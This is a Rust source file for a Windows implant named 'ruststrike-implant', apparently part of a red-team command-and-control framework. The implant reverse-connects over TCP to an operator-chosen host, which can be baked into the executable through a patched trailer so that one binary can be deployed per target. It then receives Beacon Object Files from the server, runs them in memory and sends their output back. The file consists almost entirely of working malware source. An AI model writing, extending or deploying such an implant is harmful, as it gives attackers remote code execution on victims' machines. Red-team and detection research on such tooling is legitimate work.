//! ruststrike-implant: Windows implant. Connects back to the server over TCP,
//! dispatches `hello` and `bof` messages, and returns output/error.
//!
//! Build: native Windows (`cargo build` with the stable MSVC toolchain pinned by
//! `rust-toolchain.toml`). No cross-compile target is required.

use anyhow::{Context, Result};
use ruststrike_loader::run_bof;
use ruststrike_protocol::{decode_bof, ImplantMessage, ServerMessage};
use std::io::{BufRead, BufReader, BufWriter, Read, Seek, Write};
use std::net::TcpStream;

/// Magic marker the stub builder appends to a prebuilt implant exe so it
/// reverse-connects to a baked-in host:port without CLI args. Layout:
///   <exe bytes>... "RUSTSTRIKE\x01" <host> "\x00" <port> "\x00"
/// The implant reads the last ~512 bytes of its own exe to find it; if absent
/// it falls back to args[1]/args[2]. See tools/stubbuilder + clients/server
/// stub_patcher.go.
const TRAILER_MAGIC: &[u8] = b"RUSTSTRIKE\x01";

/// Read the appended-config trailer from this exe, if present. Returns
/// (host, port) on success. Reads only the last 512 bytes (the trailer is
/// short) to avoid scanning the whole ~334 KB binary.
fn read_trailer_config() -> Option<(String, u16)> {
    let exe_path = std::env::current_exe().ok()?;
    let mut f = std::fs::File::open(&exe_path).ok()?;
    let len = f.metadata().ok()?.len();
    if len == 0 {
        return None;
    }
    let window: u64 = 512;
    let start = len.saturating_sub(window);
    f.seek(std::io::SeekFrom::Start(start)).ok()?;
    let mut tail = Vec::with_capacity((len - start) as usize);
    f.read_to_end(&mut tail).ok()?;
    // find the magic
    let idx = find_subslice(&tail, TRAILER_MAGIC)?;
    let body = &tail[idx + TRAILER_MAGIC.len()..];
    // host \0 port \0
    let host_end = body.iter().position(|&b| b == 0)?;
    let host = std::str::from_utf8(&body[..host_end]).ok()?.to_string();
    let rest = &body[host_end + 1..];
    let port_end = rest.iter().position(|&b| b == 0).unwrap_or(rest.len());
    let port: u16 = std::str::from_utf8(&rest[..port_end]).ok()?.parse().ok()?;
    if host.is_empty() || port == 0 {
        return None;
    }
    Some((host, port))
}

fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || needle.len() > haystack.len() {
        return None;
    }
    haystack
        .windows(needle.len())
        .position(|w| w == needle)
}

fn main() -> Result<()> {
    // Callback host/port resolution order:
    //   1. appended-config trailer on the exe (a patched stub) — lets an
    //      operator deploy one binary per target with no args.
    //   2. CLI args: implant <host> [port]; defaults 127.0.0.1 4444.
    let args: Vec<String> = std::env::args().collect();
    let (host, port) = read_trailer_config().unwrap_or_else(|| {
        let h = args.get(1).cloned().unwrap_or_else(|| "127.0.0.1".to_string());
        let p: u16 = args.get(2).and_then(|s| s.parse().ok()).unwrap_or(4444);
        (h, p)
    });
    let addr = format!("{host}:{port}");

    let stream = TcpStream::connect(&addr).with_context(|| format!("connecting {addr}"))?;
    eprintln!("[implant] connected to {addr}");

    let read_stream = stream.try_clone().context("cloning stream")?;
    let writer = BufWriter::new(stream);

    let (tx, rx) = std::sync::mpsc::channel::<ImplantMessage>();
    let send_tx = tx.clone();

    // Reader thread: server -> dispatch.
    std::thread::spawn(move || reader_loop(read_stream, send_tx));

    // Main thread only receives; drop our sender so the channel closes when the
    // reader thread exits.
    drop(tx);

    let mut writer = writer;
    // Sender: drain outbound messages from the channel.
    for msg in rx.iter() {
        if send(&mut writer, &msg).is_err() {
            eprintln!("[implant] connection lost");
            break;
        }
    }
    eprintln!("[implant] exiting");
    Ok(())
}

fn reader_loop(stream: TcpStream, tx: std::sync::mpsc::Sender<ImplantMessage>) {
    let mut reader = BufReader::new(stream);
    let mut line = String::new();
    loop {
        line.clear();
        match reader.read_line(&mut line) {
            Ok(0) => {
                eprintln!("[implant] server closed connection");
                break;
            }
            Ok(_) => {
                let trimmed = line.trim();
                if trimmed.is_empty() {
                    continue;
                }
                let msg = match serde_json::from_str::<ServerMessage>(trimmed) {
                    Ok(m) => m,
                    Err(e) => {
                        let _ = tx.send(ImplantMessage::Error {
                            data: format!("bad server message ({e})"),
                        });
                        continue;
                    }
                };
                let reply = handle(msg);
                if tx.send(reply).is_err() {
                    break;
                }
            }
            Err(e) => {
                eprintln!("[implant] read error: {e}");
                break;
            }
        }
    }
}

fn handle(msg: ServerMessage) -> ImplantMessage {
    match msg {
        ServerMessage::Hello => ImplantMessage::Hello {
            data: "hello from implant".to_string(),
        },
        ServerMessage::Bof { file, args } => {
            let coff = match decode_bof(&file) {
                Ok(b) => b,
                Err(e) => {
                    return ImplantMessage::Error { data: format!("decode bof: {e}") };
                }
            };
            // `args` is base64-encoded raw BOF arg buffer (binary). Decode; an
            // empty/missing args string is fine (some BOFs take none).
            let args_bytes = decode_bof(&args).unwrap_or_default();
            match run_bof(&coff, &args_bytes) {
                Ok(output) => ImplantMessage::Output { data: output },
                Err(e) => ImplantMessage::Error {
                    data: format!("run_bof: {e:#}"),
                },
            }
        }
    }
}

fn send(writer: &mut BufWriter<TcpStream>, msg: &ImplantMessage) -> Result<()> {
    writer.write_all(msg.to_json().as_bytes())?;
    writer.write_all(b"\n")?;
    writer.flush()?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a fake exe body + trailer in a temp file and confirm the reader
    /// extracts host:port. The reader reads its OWN exe (std::env::current_exe),
    /// so this test can't drive read_trailer_config directly; instead we test
    /// the trailer-parsing logic against a synthetic tail buffer via the same
    /// code path (find magic + parse fields).
    #[test]
    fn parses_trailer_from_tail() {
        // simulate an exe's last bytes: some padding, then magic + host\0 port\0
        let mut tail = b"some padding bytes that are not the magic\0\0".to_vec();
        tail.extend_from_slice(TRAILER_MAGIC);
        tail.extend_from_slice(b"10.0.0.5");
        tail.push(0);
        tail.extend_from_slice(b"4455");
        tail.push(0);
        // replicate the parse logic from read_trailer_config
        let idx = find_subslice(&tail, TRAILER_MAGIC).expect("magic present");
        let body = &tail[idx + TRAILER_MAGIC.len()..];
        let host_end = body.iter().position(|&b| b == 0).unwrap();
        let host = std::str::from_utf8(&body[..host_end]).unwrap().to_string();
        let rest = &body[host_end + 1..];
        let port_end = rest.iter().position(|&b| b == 0).unwrap();
        let port: u16 = std::str::from_utf8(&rest[..port_end]).unwrap().parse().unwrap();
        assert_eq!(host, "10.0.0.5");
        assert_eq!(port, 4455);
    }

    #[test]
    fn no_trailer_returns_none() {
        let tail = b"just some exe bytes with no magic marker at all".to_vec();
        assert!(find_subslice(&tail, TRAILER_MAGIC).is_none());
    }
}

